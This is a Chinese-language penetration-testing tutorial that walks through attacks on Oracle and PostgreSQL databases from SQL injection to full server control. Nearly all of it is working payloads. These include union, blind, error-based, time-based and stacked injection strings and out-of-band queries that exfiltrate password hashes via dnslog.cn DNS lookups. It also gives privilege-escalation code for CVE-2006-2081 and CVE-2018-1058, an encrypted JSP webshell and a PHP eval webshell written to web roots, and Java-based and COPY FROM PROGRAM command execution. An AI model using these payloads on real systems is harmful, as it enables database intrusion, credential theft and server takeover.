# 0x00 前言

偶然看到了最新的数据库流行度排名，发现在前5名的关系型数据库中，日常渗透测试见到最多的便是MySQL，排名第一的Oracle可能因为企业版高昂的价格限制了用户群众，在实际中相对于MySQL遇到的偏少，作为完全免费开源的PostgreSQL，虽然也占据了榜单Top
4，但目前在国内碰到的几率也很小。  
![image](https://image.3001.net/images/20210420/1618885112_607e39f877d4d1d9ba464.jpg!small)  
所以这次先重点研究一下Oracle与PostgreSQL这两种数据库从手注到提权的不同方式，避免过度依赖sqlmap一把梭的尴尬局面。  
![image](https://image.3001.net/images/20210420/1618885127_607e3a079a5501a7cfd62.jpg!small)

## 0x01 SQL注入分析

### 1.数据库类型判断

身为关系型数据库，自然避免不了SQL注入的话题，而在进行注入前，我们首先要对数据库的种类进行判断  
Oracle：根据特有的表进行判断

    
    
    and (select count(*) from sys.user_tables)>0
    

![image](https://image.3001.net/images/20210420/1618885145_607e3a1952067fd707690.jpg!small)  
PostgreSQL：根据特有的语法判断

    
    
    and+1::int=1--    

![image](https://image.3001.net/images/20210420/1618885166_607e3a2e71dfb6b07f994.jpg!small)  
接下来我们从各自的数据库语法去分析不同的SQL注入方式，SQL注入按照我们熟悉的注入语法又划分为:基于布尔的盲注、基于时间延迟的盲注、显错注入、联合查询注入、堆查询注入，我们依次来对两种数据库进行分析。

### 2.联合查询注入

 **Oracle**  
a.在Oracle中，存在dual虚拟表，任何用户都可以去读取查询，因为Oracle数据库的查询语句必须包含from属性，所以常用在没有目标表的select查询语句中，比如可以查询当前用户等

    
    
    and 1=2 union select null,user,null from dual（获取当前用户名）
    

![image](https://image.3001.net/images/20210420/1618885251_607e3a838ba8afd79ca42.jpg!small)  
b.Oracle联合查询注入需要依次判断每个字段的字段类型，而不能像mysql中字段直接全部套用数字型

    
    
    and 1=2 union select 1,null,null from dual 
    

若返回正常则为整数型，异常则为字符型'null'

    
    
    and 1=2 union select 1,'null','null' from dual
    

![image](https://image.3001.net/images/20210420/1618885259_607e3a8ba36739787f55e.jpg!small)  
c.Oracle数据库不支持mysql中limit功能，但可以通过rownum来限制返回的结果集的行数.查看前5个数据库用户，数据库用户均存在dba_users表中

    
    
    and 1=2 union select 1,username,password from dba_users where rownum<=5
    

![image](https://image.3001.net/images/20210420/1618885268_607e3a948953db5cc9516.jpg!small)  
d.联合查询注入需要用到查看表结构、字段名等功能，在mysql中大家所熟知的是information_schema，而在Oracle中同样拥有此类功能视图  
dba_* dba拥有的或可以访问的所有对象  
all_* 某用户拥有的或可以访问的所有的对象  
user_* 某用户拥有的所有对象(必须是拥有者owner，相当于表的创建者)  
比如在user_tab_columns中，表名与字段名一一对应展示，可以同时对表名及字段名进行查询  
and 1=2 union select 1,table_name,column_name from user_tab_columns where
rownum<=2000  
![image](https://image.3001.net/images/20210420/1618885277_607e3a9d2dd3493ab9add.jpg!small)  
e.其他常用语句：  
可通过查看数据库文件位置间接判断操作系统

    
    
    and 1=2 union select 1,name,'null' from V$DATAFILE
    

![image](https://image.3001.net/images/20210420/1618885284_607e3aa4d3d95407e40a4.jpg!small)  
查看数据库版本

    
    
    and 1=2 union select 1,version,'null' from v$instance
    

![image](https://image.3001.net/images/20210420/1618885293_607e3aadaf78540e6670d.jpg!small)  
查看用户权限

    
    
    and 1=2 union select 1,privilege,'null' from session_privs
    

![image](https://image.3001.net/images/20210420/1618885300_607e3ab4e74d5a9974d61.jpg!small)  
查看主机IP

    
    
    and 1=2 unions select utl_inaddr.get_host_address from dual
    

![image](https://image.3001.net/images/20210420/1618885308_607e3abcc634eea18178a.jpg!small)  
**PostgreSQL**  
a.在order
by确认字段数量后后需跟oracle一样，使用null来填充字段，然后依次去判断每个字段的字符类型（字符类型用'null',整数型用直接用整数代替），若直接使用整数型1,2,3来填充则会报错

    
    
    and 1=2 union select 1,2,3
    

![image](https://image.3001.net/images/20210420/1618885316_607e3ac46c86eae468534.jpg!small)

    
    
    and 1=2 union select null,null,null
    

![image](https://image.3001.net/images/20210420/1618885381_607e3b053f1661f0f7f2f.jpg!small)  
最终判断出的每个字段的类型，以及页面回显位

    
    
    and 1=2 union select 100,'null','null'
    

![image](https://image.3001.net/images/20210420/1618885389_607e3b0d341d6fd2172fa.jpg!small)  
b.查询当前数据库使用current_database()函数

    
    
    and 1=2 union select 1,current_database(),'null'
    

![image](https://image.3001.net/images/20210420/1618885397_607e3b1538d954371a682.jpg!small)  
c.PostgreSQL数据库中的pg_stat_user_tables相当于mysql中的information_schema.tables()，realname代替mysql中的table_name进行查询  
d.PostgreSQL中的limit与mysql中的使用有所差异，语法为limit 1 offset 0

    
    
    and 1=2 union select 1,relname,'null' from pg_stat_user_tables limit 1 offset 0
    

![image](https://image.3001.net/images/20210420/1618885618_607e3bf25624692222de2.jpg!small)  
之后便与mysql中的联合查询注入步骤及用法一样往后进行注入取值

    
    
    and 1=2 union select 1,column_name,'null' from information_schema.columns where table_name = 'tbuser' limit 1 offset 0
    

![image](https://image.3001.net/images/20210420/1618885627_607e3bfb5f3e71ecd9e0e.jpg!small)

    
    
    and 1=2 union select 1,username,password from tbuser where id = 2
    

![image](https://image.3001.net/images/20210420/1618885635_607e3c03c79ab044e0266.jpg!small)  
e.利用sql注入查找超级用户postgres密码PostgreSQL数据库中用户账号密码存在于pg_authid以及pg_shadow表中;

    
    
    and 1=2 union select 1,rolname,rolpassword from pg_authid limit 1 offset 0
    

![image](https://image.3001.net/images/20210420/1618885644_607e3c0c1ca185dc38379.jpg!small)

    
    
    and 1=2 union select 1,usename,passwd from pg_shadow limit 1 offset 0
    

![image](https://image.3001.net/images/20210420/1618885652_607e3c14a321cdc62604e.jpg!small)  
此处有个需要注意的地方就是md5解出来的字符并不是全部都为密码，而是为“密码+账号”，如图所示，123456为用户postgres的密码  
![image](https://image.3001.net/images/20210420/1618885662_607e3c1eb3a43139a830c.jpg!small)  
获取账号密码后，可以远程连接执行sql命令

![image](https://image.3001.net/images/20210420/1618885671_607e3c2714325a7c3fbc8.jpg!small)

### 3.布尔盲注

 **Oracle**  
a.instr()函数:查找一个字符串在指定字符串的出现位置

    
    
    and 1=(instr((select user from dual),'S'))
    and 2=(instr((select user from dual),'Y'))
    and 3=(instr((select user from dual),'S'))
    

![image](https://image.3001.net/images/20210420/1618885700_607e3c448fab5341eb824.jpg!small)  
b.decode()函数与substr()函数结合:decode函数为字符串运算函数，若字符串1等于字符串2，则返回1，不等于则返回0  
and 1=(select decode(user,'SYSTEM',1,0) from dual) --  
![image](https://image.3001.net/images/20210420/1618885711_607e3c4f4aa8697dae2ce.jpg!small)  
与substr()函数结合，进行布尔盲注

    
    
    and 1=(select decode(substr((select username||password from tbuser),1,1),'t',1,0) from dual) --    and 1=(select decode(substr((select username||password from tbuser),2,1),'e',1,0) from dual) --    and 1=(select decode(substr((select username||password from tbuser),3,1),'s',1,0) from dual) --    and 1=(select decode(substr((select username||password from tbuser),4,1),'t',1,0) from dual) --    

c.常规ascii值猜解  
先使用length()判断字符串长度

    
    
    and 8=(select length(username||password) from tbuser where rownum=1)
    

![image](https://image.3001.net/images/20210420/1618885747_607e3c736e1ee6b4e9478.jpg!small)  
再逐个字符去猜解ascii码值

    
    
    and 116=(select ascii(substr(username||password,1,1)) from tbuser where rownum=1)
    

![image](https://image.3001.net/images/20210420/1618885757_607e3c7db18f6ab3a7112.jpg!small)

    
    
    and 101=(select ascii(substr(username||password,2,1)) from tbuser where rownum=1) and 115=(select ascii(substr(username||password,3,1)) from tbuser where rownum=1)and 116=(select ascii(substr(username||password,4,1)) from tbuser where rownum=1)
    ··· 
    

**PostgreSQL:**  
a.常规ascii值猜解  
length猜解长度

    
    
    and (select length(current_database())) between 0 and 30
    

![image](https://image.3001.net/images/20210420/1618885767_607e3c87b65d6d42cae67.jpg!small)  
猜解每个字符ascii值，之后步骤与oracle相同，不再阐述

    
    
    and (select ascii(substr(current_database(),1,1))) between 0 and 127
    

![image](https://image.3001.net/images/20210420/1618885779_607e3c933e8d3d6922cb9.jpg!small)

### 4.报错注入

 **Oracle:**  
utl_inaddr.get_host_name()函数

    
    
    and 1=utl_inaddr.get_host_name((select username||password from dba_users where rownum=1))
    

![image](https://image.3001.net/images/20210420/1618885827_607e3cc3ab0e561d78121.jpg!small)  
ctxsys.drithsx.sn()函数

    
    
    and 1=ctxsys.drithsx.sn(1,(select username from dba_users where rownum=1))
    

![image](https://image.3001.net/images/20210420/1618885910_607e3d16a402fc170a736.jpg!small)  
XMLType()函数

    
    
    and (select upper(XMLType(chr(60)||chr(58)||(select username from tbuser where rownum=1)||chr(62))) from dual) is not null
    

![image](https://image.3001.net/images/20210420/1618885919_607e3d1fa77786d97b252.jpg!small)  
dbms_xdb_version.checkin()函数

    
    
    and (select dbms_xdb_version.checkin((select username||password from tbuser where rownum=1)) from dual) is not null
    

![image](https://image.3001.net/images/20210420/1618885930_607e3d2a7fce4f28f22d0.jpg!small)  
bms_xdb_version.makeversioned()函数

    
    
    and (select dbms_xdb_version.makeversioned((select username||password from tbuser where rownum=1)) from dual) is not null
    

![image](https://image.3001.net/images/20210420/1618885940_607e3d3431f0ad6a66446.jpg!small)  
dbms_xdb_version.uncheckout()函数

    
    
    and (select dbms_xdb_version.uncheckout((select username||password from tbuser where rownum=1)) from dual) is not null
    

![image](https://image.3001.net/images/20210420/1618885965_607e3d4d896a2ed5e08bd.jpg!small)  
dbms_utility.sqlid_to_sqlhash()函数

    
    
    and (SELECT dbms_utility.sqlid_to_sqlhash((select username||password from tbuser where rownum=1)) from dual) is not null
    

![image](https://image.3001.net/images/20210420/1618885976_607e3d5863de56d890aba.jpg!small)  
**PostgreSQL**  
cast()函数

    
    
    and 1=cast(current_database()::text as int)--    

![image](https://image.3001.net/images/20210420/1618885985_607e3d613f4fa116e685a.jpg!small)

    
    
    and 1=cast((select relname from pg_stat_user_tables limit 1 offset 0)::text as int)--    

![image](https://image.3001.net/images/20210420/1618885994_607e3d6a98b3441558b56.jpg!small)  
之后按照联合查询对应语句依次注入取值即可

    
    
    and 1=cast((select username||cpassword from tbuser where id=2)::text as int)--    

![image](https://image.3001.net/images/20210420/1618886003_607e3d7339c65c6b5536b.jpg!small)

### 5.延时注入

 **Oracle**  
dbms_pipe.receive_message()函数DBMS_PIPE.RECEIVE_MESSAGE('AAA',3)函数，表示将为从管道AAA返回的数据等待3秒判断是否存在

    
    
    and 1=dbms_pipe.receive_message('AAA', 3)
    

![image](https://image.3001.net/images/20210420/1618886029_607e3d8de378ad984f5ca.jpg!small)  
结合decode()函数进行盲注

    
    
    and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('AAA',3),0) from dual)
    

![image](https://image.3001.net/images/20210420/1618886038_607e3d965f70c779d83aa.jpg!small)

    
    
    and 1=(select decode(substr(user,2,1),'Y',dbms_pipe.receive_message('AAA',3),0) from dual)
    and 1=(select decode(substr(user,3,1),'S',dbms_pipe.receive_message('AAA',3),0) from dual)
    ···
    

**PostgreSQL**  
PostgreSQL中延时睡眠函数pg_sleep()与mysql中的sleep()用法一致

    
    
    and 1=(select 1 from pg_sleep(5))
    

![image](https://image.3001.net/images/20210420/1618886098_607e3dd2982198f1f2dc7.jpg!small)

### 6.堆查询注入

 **Oracle**  
Oralce不支持堆查询注入，尝试堆查询注入直接对';'报错为无效字符  
![image](https://image.3001.net/images/20210420/1618886128_607e3df0dcd5dd7b7e07f.jpg!small)  
 **PostgerSQL**  
堆叠注入可以结束上一条sql语句，开启新的sql语句，所以可以进行的操作也比较多，比如采用与联合查询注入相同的步骤，也可采用带外注入等  
![image](https://image.3001.net/images/20210420/1618886137_607e3df92b713b0616814.jpg!small)

### 7.带外注入

 **Oracle**  
oracle中包含大量低权限用户可访问的默认功能，可以使用建立带外连接。utl_http包可用于向其他主机提出任意http请求(需要公网http服务)

    
    
    and (select utl_http.request('dnslog.cn:80'||(select user from dual))is not null  
    

当没有http服务接收时，可以采用utl_inaddr包将主机名解析为IP地址，此包可根据指定的服务器生成DNS查询

    
    
    and (select utl_inaddr.get_host_address((select user from dual)||'.tmpgak.dnslog.cn') from dual)is not null
    

![image](https://image.3001.net/images/20210420/1618886205_607e3e3dc25fa74bc5886.jpg!small)  
**PostgreSQL**  
支持跨库进行查询，利用数据库拓展dblink实现dns带外注入需要先创建dblink拓展，若服务器为windows，则可以直接安装拓展

    
    
    CREATE EXTENSION dblink;
    

进行查询

    
    
    test.php?uid=1;select * from dblink('host='||(select passwd  from pg_shadow limit 1 offset 1)||'.mn8k6n.dnslog.cn user=user dbname=dbname','select user')RETURNS (result TEXT);
    

![image](https://image.3001.net/images/20210420/1618886220_607e3e4c874a17a961f2c.jpg!small)

# 0x02 数据库用户权限提升

### Oracle数据库用户提权

提升漏洞编号为CVE-2006-2081，漏洞成因由SYS用户运行的DBMS_EXPORT_EXTENSION存储过程存在PL/SQL注入漏洞，允许低权限用户以DBA权限执行任意SQL代码，此项为Oracle
10g经典提权漏洞。  
先查询用户权限：  
`select * from user_role_privs;`  
![image](https://image.3001.net/images/20210420/1618886343_607e3ec78c976a8a5ac7e.jpg!small)  
创建程序包:

    
    
    Create or REPLACE
    PACKAGE HACKERPACKAGE AUTHID CURRENT_USER
    IS
    FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env
    SYS.odcienv)
    RETURN NUMBER;
    END;
    /
    

![image](https://image.3001.net/images/20210420/1618886351_607e3ecfa0e6c74f5525e.jpg!small)  
创建程序包体：

    
    
    Create or REPLACE PACKAGE BODY HACKERPACKAGE
    IS
    FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env
    SYS.odcienv)
    RETURN NUMBER
    IS
    pragma autonomous_transaction;
    BEGIN
    EXECUTE IMMEDIATE 'GRANT DBA TO test';
    COMMIT;
    RETURN(1);
    END;
    END;
    /
    

![image](https://image.3001.net/images/20210420/1618886361_607e3ed9da344f57de130.jpg!small)  
创建过程：

    
    
    DECLARE
    INDEX_NAME VARCHAR2(200);
    INDEX_SCHEMA VARCHAR2(200);
    TYPE_NAME VARCHAR2(200);
    TYPE_SCHEMA VARCHAR2(200);
    VERSION VARCHAR2(200);
    NEWBLOCK PLS_INTEGER;
    GMFLAGS NUMBER;
    v_Return VARCHAR2(200);
    BEGIN
    INDEX_NAME := 'A1';
    INDEX_SCHEMA := 'TEST';
    TYPE_NAME := 'HACKERPACKAGE';
    TYPE_SCHEMA := 'TEST';
    VERSION := '10.2.0.2.0';
    GMFLAGS := 1;
    v_Return := SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA(INDEX_NAME =>
    INDEX_NAME,
    INDEX_SCHEMA=> INDEX_SCHEMA,
    TYPE_NAME => TYPE_NAME,
    TYPE_SCHEMA => TYPE_SCHEMA,
    VERSION => VERSION,
    NEWBLOCK => NEWBLOCK,
    GMFLAGS => GMFLAGS);
    END;
    /
    

再次查看用户权限：  
![image](https://image.3001.net/images/20210420/1618886373_607e3ee50a10cd1521236.jpg!small)  
EXP地址:  
`https://www.exploit-db.com/exploits/1719`

### PostgreSQL数据库用户权限

提升漏洞编号：CVE-2018-1058  
利用范围：PostgreSQL数据库版本9.3-10  
原理：当数据库用户创建一个数据库时，PostgreSQL会创建一个叫public的模式，任何用户都可以在public模式下创建对象，若不进行其他配置设定修改的情况下，默认查询等操作都是优先在public中进行查询。  
如select * from a等价于select * from public.a  
而名字相同的对象可以在相同数据库的不同模式下存在，也就是一个用户可以修改其他用户的查询行为，所以我们只需要通过在public模式下植入一个常见函数，比如转换大小写的函数lower(text)和upper(text)，函数功能为当此函数被超级用户调用执行时，将超级用户权限赋予低权限用户即可实现用户权限提升。  
利用步骤详情：  
1.查看tiquan用户是否具有超级用户权限

![image](https://image.3001.net/images/20210420/1618886431_607e3f1f9958ee66f65ca.jpg!small)

2.tiquan用户创建表并插入数据

`CREATE TABLE public.tiquan AS SELECT 'tiquan'::varchar AS contents;`  
![image](https://image.3001.net/images/20210420/1618886442_607e3f2a8e2f6e2925378.jpg!small)  
3.tiquan用户定义upper()函数

    
    
    CREATE FUNCTION public.upper(varchar) RETURNS TEXT AS $$
    
       ALTER ROLE tiquan SUPERUSER;
    
       SELECT pg_catalog.upper($1);
    
    $$ LANGUAGE SQL VOLATILE;
    

4.超级用户查询时候使用upper函数，此时已经执行了ALTER ROLE tiquan SUPERUSER  
![image](https://image.3001.net/images/20210420/1618886451_607e3f3347dc2da71409d.jpg!small)  
5.再次查看tiquan用户权限，成功提权至超级用户

![image](https://image.3001.net/images/20210420/1618886459_607e3f3b71a0fc2ec7cf0.jpg!small)

# 0x03 写入webshell

### Oracle写入webshell

1.利用存储过程写入webshell  
a.创建webshell目录为站点绝对路径(需要已知绝对路径)

    
    
    create or replace directory WEBSHELL_DIR as 'C:\apache-tomcat-8.5.56\webapps\Shopping';
    

![image](https://image.3001.net/images/20210420/1618886546_607e3f921ff5cbbf90603.jpg!small)  
b.利用存储过程写入一句话木马

    
    
    declare
       webshell_file utl_file.file_type;
    begin
       webshell_file := utl_file.fopen('WEBSHELL_DIR', '1.jsp', 'W'); 
       utl_file.put_line(webshell_file, '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>'); 
       utl_file.fflush(webshell_file); 
       utl_file.fclose(webshell_file); 
    end;
    /
    

![image](https://image.3001.net/images/20210420/1618886581_607e3fb5b5197c07d8f37.jpg!small)  
c.写入成功  
![image](https://image.3001.net/images/20210420/1618886590_607e3fbe670cb909a7b47.jpg!small)  
d.成功连接  
![image](https://image.3001.net/images/20210420/1618886600_607e3fc806d77c7e60eb0.jpg!small)  
2.利用数据库表空间结构写入文件先创建表空间，根据文件大小可相应修改表空间

    
    
    create tablespace jsptest datafile 'C:\apache-tomcat-8.5.56\webapps\Shopping\1.jsp' size 100k nologging;
    

![image](https://image.3001.net/images/20210420/1618886670_607e400e38654b3691ee7.jpg!small)  
创建表名并设置要插入字符的长度，此处先测试js代码，设置长度为100

    
    
    create table webshell(C varchar2(100)) tablespace jsptest;
    

![image](https://image.3001.net/images/20210420/1618886795_607e408bc55d04aaaf3d3.jpg!small)  
写入要执行的代码

    
    
    insert into WEBSHELL values(<svg/onload=alert(1>');
    

![image](https://image.3001.net/images/20210420/1618886804_607e4094be55d7ab2183f.jpg!small)  
提交数据

    
    
    commit;
    

![image](https://image.3001.net/images/20210420/1618886813_607e409d51e465ca9b8e1.jpg!small)  
提交后必须同步数据至当前表空间

    
    
    alter tablespace jsptest offline;
    

![image](https://image.3001.net/images/20210420/1618886821_607e40a5db9c125a05c1e.jpg!small)  
删除表空间

    
    
    drop tablespace jsptest including contents;
    

![image](https://image.3001.net/images/20210420/1618886829_607e40adca1d6136d6b0b.jpg!small)  
访问jsp文件  
![image](https://image.3001.net/images/20210420/1618886839_607e40b768fd0609f034d.jpg!small)

### PostgreSQL写入shell

直接利用copy函数将文件写入指定目录(需要已知绝对路径且对目录具有可操作权限)

    
    
    uid=1;copy (select '<?php @eval("$_POST[cmd]");?>') to 'C:\Users\test\Desktop\php\phpStudy\WWW\1.php';
    

![image](https://image.3001.net/images/20210420/1618886861_607e40cd8fc07be6deec7.jpg!small)  
![image](https://image.3001.net/images/20210420/1618886870_607e40d67e511e200cfb3.jpg!small)

# 0x04 提权

### Oracle提权

因为java大多是以system权限运行，所以当oracle通过java获得命令执行权限时，便相当于间接获得了system权限，因此通过java权限命令执行也可以作为Oracle的提权过程

### 1.利用java权限提权

a.先使用dba权限赋予用户java运行权限

![image](https://image.3001.net/images/20210420/1618886914_607e41026382599e6d410.jpg!small)

b.创建java包

    
    
    select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;
    

![image](https://image.3001.net/images/20210420/1618886928_607e411056b477cd0ae20.jpg!small)  
c.获取java获取权限

    
    
    select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''begin dbms_java.grant_permission( ''''SYSTEM'''', ''''SYS:java.io.FilePermission'''', ''''<<ALL FILES>>'''',''''EXECUTE'''');end;''commit;end;') from dual;
    

![image](https://image.3001.net/images/20210420/1618886940_607e411c50fd96078cdf0.jpg!small)  
d.创建执行命令的函数select

    
    
    dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function shell(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;
    

![image](https://image.3001.net/images/20210420/1618886954_607e412abdb1d37d31f7a.jpg!small)  
e.执行命令

    
    
    select shell('whoami') from dual;
    

![image](https://image.3001.net/images/20210420/1618886966_607e413661fafc351e500.jpg!small)

### 2.利用存储过程提权

oracle也可以利用存储过程来进行命令执行，当用户拥有创建存储过程权限时，则可以创建一个java class，然后用创建一个存储过程来进行调用  
a.查看权限发现用户具有create procedure权限

![image](https://image.3001.net/images/20210420/1618886977_607e414188af53c915889.jpg!small)

b.创建一个java class然后用procedure包装它进行调用

    
    
    create or replace and resolve java source named CMD as
        import java.lang.*;
        import java.io.*;
        public class CMD
        {
           public static void execmd(String command) throws IOException 
           {
                   Runtime.getRuntime().exec(command); 
           } 
       }
       /
    

![image](https://image.3001.net/images/20210420/1618886987_607e414b91759b2c49ce1.jpg!small)  
c.创建存储进程

    
    
    create or replace procedure CMDPROC(command in varchar) as language java 
        name 'CMD.execmd(java.lang.String)';
    /
    

![image](https://image.3001.net/images/20210420/1618886995_607e415364364515ba717.jpg!small)  
d.执行命令  
![image](https://image.3001.net/images/20210420/1618887002_607e415a92083f0756d43.jpg!small)  
执行成功  
![image](https://image.3001.net/images/20210420/1618887009_607e4161f29a0cda3a7d9.jpg!small)

### PostgreSQL命令执行

高权限命令执行漏洞CVE-2019-9193  
从9.3版本开始，PostgreSQL实现了导入导出数据的命令“COPY TO/FROM
PROGRAM””，而此命令允许数据库超级用户以及“pg_read_server_files”组内用户执行上任意操作系统命令  
利用条件：  
1.postgresql数据库版本在9.3-11.2  
2.执行数据库语句用户为超级用户或者“pg_read_server_files”组用户，pg_read_server_files角色权限可以执行copy命令，且此权限为11版本新增角色，11版本以下需要超级用户权限

![image](https://image.3001.net/images/20210420/1618887079_607e41a74c9f7ffb679b0.jpg!small)

接下来开始命令执行步骤：  
创建用来保存命令输出的表

    
    
    DROP TABLE IF EXISTS rce;
    CREATE TABLE  rce(rce_output text);
    

通过“COPY FROM PROGRAM”执行系统命令

    
    
    COPY rce FROM PROGRAM 'whoami';
    

查看执行结果

    
    
    SELECT * FROM rce;
    

![image](https://image.3001.net/images/20210420/1618887090_607e41b2b374c0a14fc28.jpg!small)

# 0x05 总结

本篇文章重点在于制作了Oracle与PostgreSQL数据库从注入到提权的一个全家桶套餐，但注入到提权的路有很多条，不能局限于本文的几条，希望师傅们可以多学习多总结，制作一个属于自己的吮指原味新奥尔良奶油芝士豪华全家桶。

![image](https://image.3001.net/images/20210420/1618887100_607e41bc6f2c30d0ee7ef.jpg!small)

